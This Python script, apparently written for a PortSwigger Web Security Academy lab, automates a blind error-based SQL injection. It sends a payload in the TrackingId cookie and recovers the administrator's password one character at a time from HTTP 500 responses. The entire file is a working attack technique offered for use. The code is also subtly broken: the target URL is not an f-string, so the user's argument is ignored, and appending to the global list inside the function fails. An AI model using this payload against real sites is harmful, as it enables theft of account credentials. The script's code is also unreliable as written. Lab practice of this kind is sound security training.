import sys # Import sys to pass arguments
import requests # Import the requests module to send requests
from urllib.parse import urlparse # Import urlparse to extract the lab ID

if len(sys.argv) != 2 :
    print ("Usage : python3 exploit.py <URL>")
    exit()

# Get URL from user argument
given_url = urlparse(sys.argv[1])  # e.g. "https://515698441354897.web-security-academy.net/"

# Get the hostname
hostname = given_url.hostname  # "515698441354897.web-security-academy.net"

# Extract labID (part before ".")
labID = hostname.split('.')[0]

url = 'https://{labID}.web-security-academy.net/filter?category=Lifestyle' # The URL to send the request to.

data = list() # List to store the found data.

def blind_SQLi(): # Define the function
    for pos in range(1, 21): # Iterate over the password length.
        for ascii_char in range(48,123): # Itrate over the ascii characters.
            if ascii_char > 57 and ascii_char < 65 or ascii_char > 90 and ascii_char < 97: # Skip the special characters.
                continue
            # Convert the ascii to char.
            char = chr(ascii_char)
            
            # Our payload.
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" 
            
            header = {
                'Cookie':"TrackingId=abc" + payload # Adding the payload to the cookie.
            }

            response = requests.get(url, headers=header) # Send GET request with our header.
            
            if response.status_code == 500: # Check if the response status code is 500.
                data += char # Add the char to the data list.
                print(f'Found sofar! : {"".join(data)}') # Print the found data so far.
                break
            else: # If the char is not found.
                print(f'Invalid: {char}') # Print the invalid char, I just like to see the process going.
    print(f'Password : {"".join(data)}') # Print the final password.

blind_SQLi() # Call the function to start.
